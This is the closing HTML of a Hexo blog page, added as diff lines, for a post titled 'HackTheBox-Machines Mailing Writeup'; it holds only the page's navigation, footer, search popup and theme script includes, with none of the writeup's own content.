+        <div class="page-title">HackTheBox-Machines Mailing Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">kazma</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        54 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="right-bottom-tools rss flex justify-center items-center">
+                <a class="flex justify-center items-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                <i class="fa-regular fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
